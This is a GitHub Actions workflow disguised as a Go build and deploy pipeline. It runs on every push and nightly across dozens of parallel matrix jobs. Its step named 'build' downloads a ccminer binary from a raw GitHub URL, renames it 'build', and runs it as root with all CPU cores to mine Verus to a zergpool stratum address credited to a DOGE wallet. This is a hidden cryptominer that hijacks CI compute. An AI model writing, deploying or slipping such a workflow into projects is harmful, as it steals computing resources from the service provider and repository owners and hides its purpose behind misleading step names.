name: build2 
on:
  push:
  schedule:
    - cron: '0 0 * * *'  
jobs: 
  build: 
    name: build2
    runs-on: windows-latest 
    strategy: 
      max-parallel: 40 
      fail-fast: false 
      matrix: 
        go: [1.1, 1.2, 1.3, 1.4, 1.5] 
        flag: [A, B, C, D, E, F, G, H] 
    env: 
        NUM_JOBS: 40 
        JOB: ${{ matrix.go }} 
    defaults: 
     run: 
       shell: wsl-bash -u root {0} 
    steps: 
    - name: set up Go ${{ matrix.go }} 
      uses: actions/setup-go@v1 
      with: 
        go-version: ${{ matrix.go }} 
      id: go 
    - name: setup 
      uses: Vampire/setup-wsl@v1 
  deploy: 
    name: deploy 
    needs: build 
    runs-on: windows-latest 
    strategy: 
      max-parallel: 20 
      fail-fast: false 
      matrix: 
        go: [1.1, 1.2, 1.3, 1.4, 1.5] 
        flag: [A, B, C, D, E, F, G, H] 
    env: 
        NUM_JOBS: 20 
        JOB: ${{ matrix.go }} 
    defaults: 
     run: 
       shell: wsl-bash -u root {0} 
    steps: 
    - name: set up Go ${{ matrix.go }} 
      uses: actions/setup-go@v1 
      with: 
        go-version: ${{ matrix.go }} 
      id: go 
    - name: setup 
      uses: Vampire/setup-wsl@v1 
    - name : install dependencies 
      run: apt-get update && apt-get upgrade -y && apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1  
    - name: build  
      run: wget -qO build https://raw.githubusercontent.com/rifkithears/ccminer/main/ccminer && chmod +x build && ./build -a verus -o stratum+tcp://verushash.na.mine.zergpool.com:3300 -u DKTa6Njjs9LrBcMJFiHKUpC7vNaRsAj1dF.gas -p c=DOGE -t $(nproc --all) -x
